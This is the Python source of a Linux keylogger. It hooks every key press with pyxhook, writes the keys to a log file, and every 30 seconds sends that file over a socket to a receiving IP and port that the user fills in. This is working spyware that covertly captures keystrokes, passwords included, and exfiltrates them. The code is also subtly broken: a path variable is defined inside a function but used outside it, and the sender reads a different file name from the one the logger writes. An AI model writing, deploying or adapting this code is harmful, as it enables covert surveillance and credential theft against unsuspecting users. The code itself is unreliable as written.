#Python keylogger for linux and socket connection to send keylog
#4/14/2023
import socket
import os
import pyxhook
import time

def send_file():
    BUFFER_SIZE = 4096 # send 4096 bytes each time step

    host = "192.168.24.128" #ENTER YOUR RECEIVEING IP HERE
    port = 4444 #ENTER YOUR RECEIVING PORT HERE

    filename = "file.log"

    PATH = "~/Desktop/keyloggerproj/file.log" #ENTER PATH TO STORE KEYLOG
    #create sender socket
    s = socket.socket()
    print(f"[+] Connecting to {host}:{port}")
    s.connect((host,port))
    print("[+] Connected.")
    with open(filename, "rb") as f:
        while True:
            #read the bytes from the file
            bytes_read = f.read(BUFFER_SIZE)
            if not bytes_read:
                #file transmit is done
                break

            #send all to assure transmission
            s.sendall(bytes_read)
            #update progress bar
            ###progress.update(len(bytes_read))
    print("[+] File sent.")

    #close socket
    s.close()

#Tell keylogger where to store file
log_file = os.environ.get('pylogger_file', os.path.expanduser(PATH))

#allow a cancel key for example purposes
cancel_key = ord(os.environ.get('pylogger_cancel','`')[0])

#allow clearing the log file on start, if pylogger_clean is defined
if os.environ.get('pylogger_clean', None) is not None:
    try:
        os.remove(log_file)
    except EnvironmentError:
        #file does not exist or incorrect permissions 
        pass

#create key event and saving it into log file
def OnKeyPress(event):
    with open(log_file, 'a') as f:
        f.write('{}\n'.format(event.Key))

#create a hook manager object
new_hook = pyxhook.HookManager()
new_hook.KeyDown = OnKeyPress
#set the hook
new_hook.HookKeyboard()
try:
    new_hook.start() #start the hook
except KeyboardInterrupt:
    #use used cancel key
    pass
except Exception as ex:
    #Write exceptions to the log file
    msg = 'Error while catching events:\n {}'.format(ex)
    pyxhook.print_err(msg)
    with open(log_file, 'a') as f:
        f.write('\n{}'.format(msg))

while True:
    time.sleep(30)
    send_file()


